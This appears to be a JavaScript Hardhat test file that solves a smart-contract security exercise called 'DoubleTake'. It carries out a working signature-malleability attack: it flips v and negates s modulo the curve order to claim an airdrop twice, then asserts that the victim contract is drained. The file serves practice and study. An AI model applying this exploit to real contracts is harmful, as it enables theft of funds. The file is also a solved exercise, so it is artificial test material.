const {
  time,
  loadFixture,
} = require("@nomicfoundation/hardhat-network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");
const { ethers } = require("hardhat");

const NAME = "DoubleTake";

describe(NAME, function () {
  async function setup() {
    const [owner, attackerWallet] = await ethers.getSigners();

    const VictimFactory = await ethers.getContractFactory(NAME);
    const victimContract = await VictimFactory.deploy({
      value: ethers.utils.parseEther("2"),
    });

    return { victimContract, attackerWallet };
  }

  describe("exploit", async function () {
    let victimContract, attackerWallet;
    before(async function () {
      ({ victimContract, attackerWallet } = await loadFixture(setup));

      // claim your first Ether
      const v = 28;
      const r =
        "0xf202ed96ca1d80f41e7c9bbe7324f8d52b03a2c86d9b731a1d99aa018e9d77e7";
      const s =
        "0x7477cb98813d501157156e965b7ea359f5e6c108789e70d7d6873e3354b95f69";

      await victimContract
        .connect(attackerWallet)
        .claimAirdrop(
          "0x70997970c51812dc3a010c7d01b50e0d17dc79c8",
          ethers.utils.parseEther("1"),
          v,
          r,
          s
        );
    });

    it("conduct your attack here", async function () {
      // Exploit is signature malleability
      // Refer: https://github.com/kadenzipfel/smart-contract-vulnerabilities/blob/master/vulnerabilities/signature-malleability.md

      // Flipped v
      const v = 27;

      // r remains the same
      const r =
        "0xf202ed96ca1d80f41e7c9bbe7324f8d52b03a2c86d9b731a1d99aa018e9d77e7";

      // new s becomes (oldS * -1) % n where n = 115792089237316195423570985008687907852837564279074904382605163141518161494337
      // I just used python :p
      // n = 115792089237316195423570985008687907852837564279074904382605163141518161494337
      // oldS = 0x7477cb98813d501157156e965b7ea359f5e6c108789e70d7d6873e3354b95f69
      // s = hex(-oldS % n)
      const s =
        "0x8b8834677ec2afeea8ea9169a4815ca4c4c81bde36aa2f63e94b20597b7ce1d8";

      await victimContract
        .connect(attackerWallet)
        .claimAirdrop(
          "0x70997970c51812dc3a010c7d01b50e0d17dc79c8",
          ethers.utils.parseEther("1"),
          v,
          r,
          s
        );
    });

    after(async function () {
      expect(await ethers.provider.getBalance(victimContract.address)).to.equal(
        0,
        "victim contract is drained"
      );
    });
  });
});
